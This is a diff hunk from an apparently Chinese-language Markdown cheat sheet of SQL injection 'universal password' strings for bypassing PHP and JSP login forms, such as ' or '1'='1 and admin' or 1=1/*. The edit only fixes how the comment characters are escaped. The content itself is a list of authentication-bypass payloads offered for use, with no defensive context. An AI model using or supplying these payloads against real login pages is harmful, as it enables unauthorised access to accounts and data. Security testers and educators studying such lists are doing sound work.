@@ -40,10 +40,10 @@ SELECT * FROM admin WHERE Name=''or 1=1 --' and passWord='111'
 * `..admin' or 'a'='a 密码随便`
 
 ###PHP万能密码
-* `'or 1=1/\*`
+* `'or 1=1/*`
 * `User: something`
 * `Pass: ' or '1'='1`
 
 ###jsp 万能密码
 * `1'or'1'='1`
-* `admin' or 1=1/\*`
+* `admin' or 1=1/*`
